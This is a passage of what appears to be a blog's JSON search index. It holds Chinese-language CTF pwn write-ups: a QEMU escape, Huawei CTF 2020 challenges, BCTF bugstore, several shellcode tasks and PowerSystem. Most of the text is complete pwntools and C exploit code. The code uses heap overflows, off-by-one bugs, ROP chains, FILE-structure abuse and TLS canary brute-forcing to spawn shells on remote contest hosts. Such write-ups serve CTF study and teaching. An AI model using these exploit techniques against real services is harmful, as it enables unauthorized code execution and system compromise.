*mmio;/*我们程序的缓冲在虚拟机里对应的物理地址*/size_t buffer_phys_addr;char *buffer;void die(char *msg) &#123;   perror(msg);   exit(-1);&#125;//写设备内存void mmio_write(uint32_t addr,uint32_t val) &#123;   *((uint32_t *)(mmio + addr)) = val;&#125;//读设备内存uint64_t mmio_read(uint32_t addr) &#123;   return *((uint32_t *)(mmio + addr));&#125;void setPhyAddr(uint32_t val) &#123;   mmio_write(32,val);&#125;void setPos(uint32_t val) &#123;   mmio_write(16,val);&#125;void setLength(uint32_t val) &#123;   mmio_write(24,val);&#125;void enc() &#123;   mmio_write(80,0x666);&#125;void mem_read_write(uint32_t phyAddr,uint32_t pos,uint32_t length) &#123;   setPhyAddr(phyAddr);   setPos(pos);   setLength(length);   mmio_write(96,0x666);&#125;size_t get_phys_addr(char *vir_addr) &#123;   int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY); /*打开页映射表*/   if (fd == -1) &#123;      die(&quot;open pagemap error&quot;);   &#125;   size_t vir = (size_t)vir_addr;   // /0x1000获得是第n页的这个n，由于一个记录数据8字节，因此*8，算的的就是该页在文件里的记录的偏移   size_t offset = vir / 0x1000 * 8;   if (lseek(fd,offset,SEEK_SET) == -1) &#123;      die(&quot;lseek pagemap error&quot;);   &#125;   size_t addr;   if (read(fd,&amp;addr,8) != 8) &#123;      die(&quot;read pagemap error&quot;);   &#125;   addr = (addr &amp; PFN_MASK);   return addr;&#125;int main(int argc,char ** argv) &#123;   //打开设备   int fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;,O_RDWR);   if (fd == -1) &#123;      die(&quot;open device error&quot;);   &#125;   //映射设备内存   mmio = mmap(NULL,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,fd,0);   if (mmio == MAP_FAILED) &#123;      die(&quot;mmap device memory error&quot;);   &#125;   /*映射一块缓冲区*/   buffer = mmap(NULL,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS,-1,0);   if (buffer == MAP_FAILED) &#123;      die(&quot;mmap local buffer error&quot;);   &#125;   //必须锁住内存，才能准确获得物理地址   mlock(buffer, 0x1000);   //获得buffer的物理映射地址   buffer_phys_addr = get_phys_addr(buffer);   printf(&quot;buffer_phys_addr=0x%lx\\n&quot;,buffer_phys_addr);   size_t *d = (size_t *)buffer;   d[0] = buffer_phys_addr * 0x1000;   d[1] = (0xFD0 &lt;&lt; 16) | 0x11;   mem_read_write(buffer_phys_addr,0x20,0x10);   //Off by one读取对象指针低1字节   mem_read_write(buffer_phys_addr,0xFFF,0x3);   printf(&quot;obj_addr_low_bit=0x%x\\n&quot;,buffer[1]);   buffer[1] = buffer[1] + 0x30;   //Off by one使得对象指针下移   mem_read_write(buffer_phys_addr,0xFFF,0x2);   //泄露cpu_physical_memory_rw地址   mem_read_write(buffer_phys_addr,0xFD0,0x7);   size_t obj_addr = d[0] - 0x30;   size_t elf_base = d[1] - 0x5bc5c0;   size_t system_addr = elf_base + 0x2A7A80;   //push rsi ; pop rsp ; clc ; jmp qword ptr [rsi + 0xf]   size_t gadget = elf_base + 0x0000000000321956;   size_t pop_rdi = elf_base + 0x00000000002ad4a5;   size_t pop_rsp = elf_base + 0x00000000002ad883;   /*pop rax ; pop rbx ; pop rbp ; ret*/   size_t pop_3 = elf_base + 0x00000000003b15ff;   printf(&quot;obj_addr=0x%lx\\n&quot;,obj_addr);   printf(&quot;elf_base=0x%lx\\n&quot;,elf_base);   printf(&quot;system_addr=0x%lx\\n&quot;,system_addr);   setPos(0x28);   setLength((0x28+0x4) * 2);   enc();   memset(buffer,0,0x1f);   memcpy(buffer+0x1f,&amp;pop_3,0x8); //   //rop   d = (size_t *)(buffer + 0x28);   d[0] = pop_rsp;   d[1] = obj_addr+0xe19 + 0x47 + 0x9e0;   d = (size_t *)(buffer + 0x47);   d[0] = pop_rdi;   d[1] = obj_addr+0xe19 + 0x5f + 0x9e0;   d[2] = system_addr;   memcpy(buffer+0x5f,&quot;cat flag&quot;,0x8);   d = (size_t *)(buffer + 0x1f7);   d[0] = obj_addr+0xe19;   d[1] = gadget;   mem_read_write(buffer_phys_addr,0x666,0x6);   //getchar();   //getshell   mem_read_write(buffer_phys_addr,0x666,0x6);   return 0;&#125;","categories":["CTF"],"tags":["off by one","QEMU"]},{"title":"华为CTF2020第三场_harmofs01","url":"/2020/12/28/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%89%E5%9C%BA-harmofs01/","content":"在seek功能里使用了abs，可以第一次传入0x80000000，然后第二次传入0x7fffffff，即可将8offset设置为负数，改写size，实现全局读写。在本地进行调试时，发现musl libc会崩溃，用第三方musl libc也崩溃，patch掉崩溃的地方，即可在本地成功运行。\n\n还需要泄露堆地址，才可以实现任意地址读写，free几个堆形成链表，然后溢出，泄露指针即可。构造内存泄露函数，泄露远程栈布局，确定ROP位置写ROP即可。\n#coding:utf8from pwn import *local = Falsesh = remote(&#x27;124.71.139.184&#x27;,31392)#sh = remote(&#x27;192.168.139.230&#x27;,10002)#sh = remote(&#x27;127.0.0.1&#x27;,10004)#libc = ELF(&#x27;./libc.so&#x27;)libc = ELF(&#x27;./bak.so&#x27;)sh.recvuntil(&#x27;Gift: &#x27;)libc_base = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16) - libc.sym[&#x27;puts&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()envirom_addr = libc_base + libc.sym[&#x27;_environ&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)print &#x27;binsh_addr=&#x27;,hex(binsh_addr)print &#x27;envirom_addr=&#x27;,hex(envirom_addr)sh.recvuntil(&#x27;Gift: &#x27;)elf_base = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16) - 0x12d8#0x0000178c : pop &#123;r0, lr&#125; ; bx lrpop_r0_lr = elf_base + 0x0000178cbackdoor = elf_base + 0x1248print &#x27;elf_base=&#x27;,hex(elf_base)def add(size,name):   sh.sendlineafter(&#x27;Sh &gt; &#x27;,&#x27;touch&#x27;)   sh.sendlineafter(&#x27;File size: &#x27;,str(size))   sh.sendlineafter(&#x27;File name: &#x27;,name)def seek(name,mode,offset):   sh.sendlineafter(&#x27;Sh &gt; &#x27;,&#x27;fileop&#x27;)   sh.sendlineafter(&#x27;File name:&#x27;,name)   sh.sendlineafter(&#x27;Operation:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Mode:&#x27;,str(mode))   sh.sendlineafter(&#x27;Offset:&#x27;,str(offset))def edit(name,size,content):   sh.sendlineafter(&#x27;Sh &gt; &#x27;,&#x27;fileop&#x27;)   sh.sendlineafter(&#x27;File name:&#x27;,name)   sh.sendlineafter(&#x27;Operation:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   sleep(1)   sh.send(content)def show(name,size):   sh.sendlineafter(&#x27;Sh &gt; &#x27;,&#x27;fileop&#x27;)   sh.sendlineafter(&#x27;File name:&#x27;,name)   sh.sendlineafter(&#x27;Operation:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))def delete(name):   sh.sendlineafter(&#x27;Sh &gt; &#x27;,&#x27;fileop&#x27;)   sh.sendlineafter(&#x27;File name:&#x27;,name)   sh.sendlineafter(&#x27;Operation:&#x27;,&#x27;4&#x27;)for i in range(5):   add(0x88,str(i))for i in range(0,5,2):   delete(str(i))seek(&#x27;1&#x27;,0,0x80000000)#设置offset为-4seek(&#x27;1&#x27;,1,0x7ffffffc)#修改size,实现qua全局读写edit(&#x27;1&#x27;,0x5,p32(0x7fffffff) + &#x27;\\n&#x27;)seek(&#x27;1&#x27;,0,0)#context.log_level = &#x27;debug&#x27;#泄露堆地址show(&#x27;1&#x27;,0x100)sh.recvuntil(&#x27;\\xb1&#x27;)sh.recv(0xb)heap_addr = u32(sh.recv(4))base = heap_addr + 0x24print &#x27;heap_addr=&#x27;,hex(heap_addr)print &#x27;base=&#x27;,hex(base)add(0x88,&#x27;2&#x27;)def setPos(addr):   seek(&#x27;2&#x27;,0,0x80000000)   offset = addr - base   print &#x27;offset=&#x27;,hex(offset)   if offset &lt; 0:      #设置offset为-4      seek(&#x27;2&#x27;,1,0x7ffffffc)      #修改size,实现全局读写      edit(&#x27;2&#x27;,0x5,p32(0xffffffff) + &#x27;\\n&#x27;)      offset = 0x100000000 + offset      seek(&#x27;2&#x27;,0,0x80000000)      seek(&#x27;2&#x27;,1,offset - 0x80000000)   else:      #设置offset为-4      seek(&#x27;2&#x27;,1,0x7ffffffc)      if offset &gt;= 0x80000000:         edit(&#x27;2&#x27;,0x5,p32(0xffffffff) + &#x27;\\n&#x27;)      else:         edit(&#x27;2&#x27;,0x5,p32(0x7fffffff) + &#x27;\\n&#x27;)      seek(&#x27;2&#x27;,0,offset)def leak(addr):   setPos(addr)   show(&#x27;2&#x27;,0x4)def write(addr,size,content):   setPos(addr)   edit(&#x27;2&#x27;,size,content)#context.log_level = &#x27;debug&#x27;#raw_input()leak(envirom_addr)stack_addr = u32(sh.recvuntil(&#x27;Sh &gt;&#x27;,drop = True)[-4:])if local:   rop_addr = stack_addr - 0x450else:   rop_addr = stack_addr - 0x5b8print &#x27;stack_addr=&#x27;,hex(stack_addr)print &#x27;rop_addr=&#x27;,hex(rop_addr)sh.sendline(&#x27;fileop&#x27;)sh.sendlineafter(&#x27;File name:&#x27;,&#x27;ha1vk&#x27;)#context.log_level = &#x27;debug&#x27;#搜索栈数据，确定ROP地址&#x27;&#x27;&#x27;for i in range(0,0xc,0x4):   leak(rop_addr - i)   stack_addr = u32(sh.recvuntil(&#x27;Sh &gt;&#x27;,drop = True)[-4:])   sh.sendline(&#x27;fileop&#x27;)   sh.sendlineafter(&#x27;File name:&#x27;,&#x27;ha1vk&#x27;)   print hex(stack_addr)&#x27;&#x27;&#x27;if local:   write(rop_addr,0xc,p32(pop_r0_lr) + p32(binsh_addr) + p32(system_addr))else:   payload = p32(pop_r0_lr) + p32(rop_addr + 0xc) + p32(backdoor) + &#x27;/etc/flag\\x00\\n&#x27;   write(rop_addr,len(payload),payload)sh.interactive()","categories":["CTF"],"tags":["整数溢出","abs函数溢出","musl"]},{"title":"华为CTF2020第三场_honormap01","url":"/2020/12/28/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%89%E5%9C%BA-honormap01/","content":"在输入width时使用的是%x格式化字符串，会输入4字节内存\n\n而w位于h之上，那么就可以把h覆盖，从而绕过了对h的大小限制。\n\n修改h以后，就能进行堆溢出了，首先越界读，泄露func指针，计算程序基址，计算后门函数。然后利用越界写将func指针修改为后门函数地址。接下来调用后面函数时，由于第一个参数是这个结构体本身，而w和h不能自由控制。因此我们使用堆喷构造好堆布局，使得有两个堆正好相邻，然后利用前一个堆溢出越界写当前结构体的内容。可以通过show前一个节点，来查看是否堆喷成功。\n#coding:utf8from pwn import *context.log_level = &#x27;debug&#x27;#sh = remote(&#x27;192.168.139.188&#x27;,10001)sh = remote(&#x27;124.70.221.177&#x27;,30107)def add(type,h,w):   sh.sendlineafter(&#x27;CMD &gt;&#x27;,&#x27;alloc&#x27;)   sh.sendlineafter(&#x27;Height:&#x27;,hex(h))   sh.sendlineafter(&#x27;Width:&#x27;,hex(w))   sh.sendlineafter(&#x27;Map type:&#x27;,str(type))def delete(index):   sh.sendlineafter(&#x27;CMD &gt;&#x27;,&#x27;delete&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;CMD &gt;&#x27;,&#x27;view&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def edit0(index,x,y,size,content):   sh.sendlineafter(&#x27;CMD &gt;&#x27;,&#x27;edit&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendlineafter(&#x27;X:&#x27;,str(x))   sh.sendlineafter(&#x27;Y:&#x27;,str(y))   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendlineafter(&#x27;Fill:&#x27;,content)def edit1(index,x,y,content):   sh.sendlineafter(&#x27;CMD &gt;&#x27;,&#x27;edit&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendlineafter(&#x27;X:&#x27;,str(x))   sh.sendlineafter(&#x27;Y:&#x27;,str(y))   sh.sendlineafter(&#x27;Value:&#x27;,content)add(0,0x19,0x1b0050)for i in range(1,0x8):   add(0,0x19,0x50)for i in range(0x8,0xf):   add(0,0x19,0x1f0050)   edit0(i,0,0,10,&quot;tagtagta&quot; + str(i))show(0)sh.recvuntil(&#x27;Map: &#x27;)for i in range(0x19):   sh.recvuntil(&#x27;\\n&#x27;)elf_base = u32(sh.recv(4)) - 0x11a0backdoor = elf_base + 0x1350print &#x27;elf_base=&#x27;,hex(elf_base)print &#x27;backdoor=&#x27;,hex(backdoor)cmd = &#x27;/etc/flag\\x00&#x27;def leak(n):   edit0(n,0,0,9,&#x27;a&#x27;*0x9)   show(n)   ans = sh.recvuntil(&#x27;CMD &gt;&#x27;)   sh.sendline(&#x27;&#x27;)   offset = ans.index(&#x27;tagtagta&#x27;)   return offset - 0x64 + 0x5,int(ans[offset+8:offset + 10])sh.sendline(&#x27;&#x27;)offset,n = leak(8)print nedit0(n,0x19,0,0x4,p32(backdoor))x = offset / 80y = offset - x*80print &#x27;x=&#x27;,x,&#x27;y=&#x27;,yedit0(8,x,y,len(cmd),cmd)show(8)#读取flagsh.sendlineafter(&#x27;CMD &gt;&#x27;,&#x27;edit&#x27;)sh.sendlineafter(&#x27;Index:&#x27;,str(n))sh.interactive()","categories":["CTF"],"tags":["heap spray","变量覆盖"]},{"title":"华为CTF2020第二场_HONORBOOK","url":"/2020/12/24/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%BA%8C%E5%9C%BA-HONORBOOK/","content":"架构是risc-v的，IDA装上插件勉强能看汇编，但是没有进行重定位不好看，直接进行盲打测试，发现程序先是malloc(0x20)，用于存放name和content指针，然后content通过malloc(0xf0)获得，name没有进行\\0截断，可以用于泄露content指针，而输入content时，存在一个off by one，libc为glibc 2.27，于是就可以直接开始进行利用了。\n#coding:utf8from pwn import *sh = remote(&#x27;121.36.192.114&#x27;,9999)def add(index,name,msg,line = True):   sh.sendlineafter(&#x27;Code:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;ID:&#x27;,str(index))   sh.sendafter(&#x27;User name:&#x27;,name)   if line:      sh.sendlineafter(&#x27;Msg:&#x27;,msg)   else:      sh.sendafter(&#x27;Msg:&#x27;,msg)def delete(index):   sh.sendlineafter(&#x27;Code:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;ID:&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;Code:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;ID:&#x27;,str(index))def edit(index,msg):   sh.sendlineafter(&#x27;Code:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendafter(&#x27;Msg:&#x27;,msg)add(0,&#x27;a&#x27;*0x18,&#x27;b&#x27;*0xe0) #0show(0)sh.recvuntil(&#x27;a&#x27;*0x18)heap_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)add(1,&#x27;b&#x27;,&#x27;b&#x27;*0xc0) #1add(2,&#x27;c&#x27;,&#x27;c&#x27;*0xb0 + p64(0) + p64(0x21) + &#x27;c&#x27;*0x10 + p64(0) + p64(0x21)) #2add(3,&#x27;d&#x27;,&#x27;/bin/sh\\x00&#x27;) #3delete(1)#null by one修改2的node的sizeadd(1,&#x27;b&#x27;,&#x27;b&#x27;*0xe8 + p8(0xf1),False)for i in range(4,11):   add(i,&#x27;e&#x27;,&#x27;e&#x27;)for i in range(4,11):   delete(i)delete(2)for i in range(4,11):   add(i,&#x27;e&#x27;,&#x27;e&#x27;)#将2的content指向1的nodeadd(2,&#x27;c&#x27;*0x18,&#x27;c&#x27;*0x20 + p64(0) + p64(0x21) + &#x27;ha1vk&#x27;.ljust(0x18,&#x27;c&#x27;) + p64(heap_addr + 0xf0))#leak got&#x27;&#x27;&#x27;for i in range(0x10):   edit(2,&#x27;ha1vk&#x27;.ljust(0x18,&#x27;c&#x27;) + p64(0x13018 + i*0x8))   show(1)   sh.recvuntil(&#x27;Msg: &#x27;)   free_got_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))   print &#x27;free_got_addr=&#x27;,hex(free_got_addr)&#x27;&#x27;&#x27;free_got = 0x13018 + 11*0x8edit(2,&#x27;ha1vk&#x27;.ljust(0x18,&#x27;c&#x27;) + p64(free_got))show(1)sh.recvuntil(&#x27;Msg: &#x27;)free_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))libc_base = free_addr - 0x62CA6system_addr = libc_base + 0x388FEprint &#x27;free_addr=&#x27;,hex(free_addr)print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#修改free的got表edit(1,p64(system_addr)[0:4])#getshelldelete(3)sh.interactive()\n","categories":["CTF"],"tags":["glibc 2.27","off by one","risc-v"]},{"title":"已知libc地址爆破TLS、ld.so等地址","url":"/2020/07/01/%E5%B7%B2%E7%9F%A5libc%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4TLS_ld.so%E7%AD%89%E5%9C%B0%E5%9D%80/","content":"在大多数情况下，[远程的ld.so以及TLS等结构的地址与libc地址之间的偏移与本地的会不一样，但是大致处于一个范围内]{.mark}，并且，在同一个系统里，这个差值是固定的，其差值的变化往往在偏移的第1.5BYTE~2.5BYTE的位置，即地址十六进制的第4、5个数，因此我们只需爆破2个十六进制数即可。\n以列题来说明\nBCTF_2018_bugstore在函数中有栈溢出，但是有canary保护\n\n\n我们来看看输入函数，输入函数遇到0就结束了输入，而我们知道canary的最后一个字节一定是0，因此，我们输入了canary，后面的内容就输入不了了，因此，需要利用程序提供的任意地址写漏洞将TLS结构里canary覆盖为全部字节非零的值。\n我们已知libc地址，TLS地址与libc地址字节的偏移在同一个系统里是固定的，但是不同系统、机器里，偏移就有微小变化，但是变化不大，一般在地址十六进制的第4、5个数，因此，我们可以爆破。\n#coding:utf8from pwn import *libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)#爆破TLS的地址for x in range(0xF):   for y in range(0xF):      try:         #sh = process(&#x27;./BCTF_2018_bugstore&#x27;)         sh = remote(&#x27;node3.buuoj.cn&#x27;,26763)         sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;F&#x27;)         sh.sendline(&#x27;%p-%p-%p-%p-%p-%p-%p-%p-%p-LIBC:%p-&#x27;)         sh.recvuntil(&#x27;LIBC:&#x27;)         libc_base = int(sh.recvuntil(&#x27;-&#x27;,drop = True),16) - 0xE7 - libc.sym[&#x27;__libc_start_main&#x27;]         one_gadget_addr =  libc_base + 0x4f322         print &#x27;libc_base=&#x27;,hex(libc_base)         print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)         offset = 0x6 &lt;&lt; 20         offset += x &lt;&lt; 16         offset += y &lt;&lt; 12         offset += 0x528         #覆盖TLS里面的canary         sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;A&#x27;)         tls_canary_addr = libc_base + offset         sh.sendline(str(tls_canary_addr))         print &#x27;tls_canary_addr=&#x27;,hex(tls_canary_addr)         sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;S&#x27;)         payload = &#x27;a&#x27;*0x28 + &#x27;BUGSTORE&#x27; + &#x27;a&#x27;*0x8 + p64(one_gadget_addr)         sh.sendline(payload)         sh.interactive()      except:         print &#x27;trying...&#x27;         sh.close()\n","categories":["CTF"],"tags":["爆破","TLS覆盖","dl_resolve"]},{"title":"shellcode题总结","url":"/2020/04/30/%E6%9C%89%E5%85%B3shellcode%E9%A2%98%E7%9A%84%E6%80%BB%E7%BB%93/","content":"有时shellcode受限，最好的方法一般就是勉强的凑出sys read系统调用来输入shellcode主体。下面从几个题来加深理解。\nstarctf_2019_babyshell现在shellcode字节允许的范围在表内\n\n\n\n\n我们直接用IDA强制转为汇编，我们发现pop rdx、pop rdi、syscall可以用。\n\n\n而执行shellcode时，正好eax也被设置为0\n\n\n然后rsi正好也是指向shellcode\n\n\n因此，read的系统调用所需的都俱全，构造出read系统调用输入shellcode主体即可。\n#coding:utf8from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)#sh = process(&#x27;./starctf_2019_babyshell&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25035)shellcode = asm(&#x27;&#x27;&#x27;pop rdi                   pop rdi                   pop rdi                   pop rdi                   pop rdi                   pop rdi                   pop rdi                   pop rdi                   pop rdx                   pop rdi                   syscall                &#x27;&#x27;&#x27;)sh.sendlineafter(&#x27;give me shellcode, plz:&#x27;,shellcode)sleep(0.5)sh.send(&#x27;a&#x27;*0xC + asm(shellcraft.sh()))sh.interactive()\n\n铁人三项(第五赛区)_2018_seven限制7字节shellcode\n\n\n并且执行到我们的shellcode时，rsp已经调整，寄存器也基本清空\n\n\n由于栈调试，栈里没有合适的数据\n\n\n此时，唯一的办法是先rsp指向的地方进行输入。然而7字节也算不够jmp rsp的。最多到syscall。由于开启了随机化，因此rsp和rip值哪个大是不确定的，当rsp在rip上方的时候，通过read，就可以覆盖到rip所指向的内存，覆盖为shellcode。因此，只需要多次尝试，总有一次rsp在rip上方附近的时候，就可以成功在rip后面的位置写入主体shellcode。\n#coding:utf8from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)#sh = process(&#x27;./2018_seven&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29741)shellcode = asm(&#x27;&#x27;&#x27;push rsp                   pop rsi                   mov edx,esi                   syscall                &#x27;&#x27;&#x27;)sh.sendafter(&#x27;Show me your shellcode:&#x27;,shellcode)payload = &#x27;\\x00&#x27;*0xB36 + asm(shellcraft.sh())sleep(0.1)sh.sendline(payload)sh.interactive()\n\n鹏城杯_2018_treasure通过构造shellcode，向栈里布置rop链\n#coding:utf8from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)#sh = process(&#x27;./2018_treasure&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29793)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)elf = ELF(&#x27;./2018_treasure&#x27;)read_plt = elf.plt[&#x27;read&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]vuln_addr = 0x00000000004009BApop_rdi = 0x0000000000400b83pop_rsi = 0x0000000000400b81sh.sendlineafter(&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;,&#x27;Y&#x27;)#向栈里输入ropshellcode = asm(&#x27;&#x27;&#x27;push rsp                   pop rsi                   mov edx,esi                   syscall                   ret                &#x27;&#x27;&#x27;)sh.sendafter(&#x27;start!!!!&#x27;,shellcode)rop = p64(pop_rdi) + p64(puts_got) + p64(puts_plt)rop += p64(vuln_addr)sleep(0.2)sh.send(rop)puts_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]one_gadget_addr = libc_base + 0x4f322sh.sendlineafter(&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;,&#x27;Y&#x27;)#向栈里输入ropshellcode = asm(&#x27;&#x27;&#x27;push rsp                   pop rsi                   mov edx,esi                   syscall                   ret                &#x27;&#x27;&#x27;)sh.sendafter(&#x27;start!!!!&#x27;,shellcode)sleep(0.2)payload = p64(one_gadget_addr) + &#x27;\\x00&#x27;*0x50sh.send(payload)sh.interactive()\n\n因此，对于一些受限的shellcode，我们最好的办法是构造read系统调用。\n","categories":["CTF"],"tags":["shellcode"]},{"title":"纵横杯2020_PowerSystem","url":"/2020/12/26/%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-PowerSystem/","content":"登录逻辑使用的是strncmp进行hash比较\n\n而pwd_hash的内容为\n\n\\0截断，因此只需爆破一下密码即可登录成功\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;openssl/sha.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;unsigned char result[32];void print(char *str) &#123;   write(1,str,strlen(str));&#125;char hash[33] = &quot;\\xe8\\x50\\x00&quot;;int main() &#123;   char prex[0x9] = &#123;0&#125;;   for (int a=0;a&lt;0xff;a++) &#123;      prex[0] = a;      for (int b=0;b&lt;0xff;b++) &#123;         prex[1] = b;         for (int c=0;c&lt;0xff;c++) &#123;            prex[2] = c;            SHA256((const unsigned char*)prex,3,result);            if (!memcmp(hash,result,3)) &#123;               printf(&quot;abc=%02x%02x%02x&quot;,a,b,c);            &#125;         &#125;      &#125;   &#125;&#125;\n爆破出密码\\x40\\xa6\\x56主程序中，adjust函数存在负数下标越界\n\n可以利用越界劫持bss上的stdout指针，由于flags字段无法一步控制到位，发现stderr指向的位置正好位于_IO_2_1_stdout上方，且之间距离在0xE0，因此可以写stderr指向的结构，来间接控制_IO_2_1_stdout的flags，从而就可以利用_IO_2_1_stdout进行泄露了。接下来，在上方有一个dso_handle指针，\n\n它指向自己，但是不能直接达到利用，因为写size时会把指针覆盖掉。\n我们可以将_IO_2_1_stdout的缓冲区劫持到dso_handle上方，使得缓冲区里的数据将dso_handle的低字节覆盖，这样就使得dso_handle指针仍然指向了bss附近，但没有指向自己，由此就可以利用adjust来构造任意地址写。最后劫持栈做ROP即可\n#coding:utf8from pwn import *libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#x27;)#sh = process(&#x27;./Power_System&#x27;)sh = remote(&#x27;182.92.203.154&#x27;,15268)def login():   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Please input admin account :&#x27;,&#x27;QAQ&#x27;)   sh.sendlineafter(&#x27;password :&#x27;,&#x27;\\x40\\xa6\\x56&#x27;)def adjust(index,size,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;power:&#x27;,str(index))   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendafter(&#x27;staff:&#x27;,content)login()adjust(-0x6,0,&#x27;\\x00&#x27;*0x17 + &#x27;\\n&#x27;)sh.sendline(&#x27;2&#x27;)sh.sendline(&#x27;-2&#x27;)sh.sendline(&#x27;0&#x27;)sh.send(&#x27;\\x00&#x27;*0xd8 + p64(0x0FBAD1887))sh.recv(1)sh.recv(0x80)libc_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x1e5700system_addr = libc_base + libc.sym[&#x27;system&#x27;]environ_addr = libc_base + libc.sym[&#x27;__environ&#x27;]stdout_vtable_ptr_addr = libc_base + 0x1e5838print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;stdout_vtable_ptr_addr=&#x27;,hex(stdout_vtable_ptr_addr)sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;&#x27;)#泄露栈地址adjust(-0x6,0,p64(0)*0x3 + p64(environ_addr) + p64(environ_addr + 0x8) + &#x27;\\n&#x27;)sh.sendline(&#x27;2&#x27;)sh.sendline(&#x27;-2&#x27;)sh.sendline(&#x27;0&#x27;)sh.send(&#x27;\\x00&#x27;*0xd8 + p64(0x0FBAD1887))sh.recv(1)stack_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;stack_addr=&#x27;,hex(stack_addr)sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;&#x27;)#泄露程序基址adjust(-0x6,0,p64(0)*0x3 + p64(stack_addr - 0x30) + p64(stack_addr - 0x30 + 0x8) + &#x27;\\n&#x27;)sh.sendline(&#x27;2&#x27;)sh.sendline(&#x27;-2&#x27;)sh.sendline(&#x27;0&#x27;)sh.send(&#x27;\\x00&#x27;*0xd8 + p64(0x0FBAD1887))sh.recv(1)elf_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x11babase = elf_base + 0x7070print &#x27;elf_base=&#x27;,hex(elf_base)print &#x27;base=&#x27;,hex(base)sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;&#x27;)rop_addr = stack_addr - 0xf0 - 0x8#利用stdout缓冲区修改__dso_handle指针的低位adjust(-0x6,0,p64(0)*0x6 + p64(elf_base + 0x7000) + p64(elf_base + 0x7009) + &#x27;\\n&#x27;)sh.sendline(&#x27;2&#x27;)sh.sendline(&#x27;-2&#x27;)sh.sendline(&#x27;0&#x27;)sh.send(&#x27;\\x00&#x27;*0xd8 + p64(0x0FBAD1887))sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;&#x27;)adjust(-0xd,0,&#x27;\\x01&#x27;*0x7 + p64(rop_addr) + &#x27;\\n&#x27;)#写roppop_rdi = elf_base + 0x00000000000020fbpop_2 = elf_base + 0x00000000000020f8binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;&#x27;)adjust(1,0,p64(pop_2) + p64(0)*0x2 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) + &#x27;\\n&#x27;)#getshellsh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)sh.interactive()","categories":["CTF"],"tags":["下标越界","IO 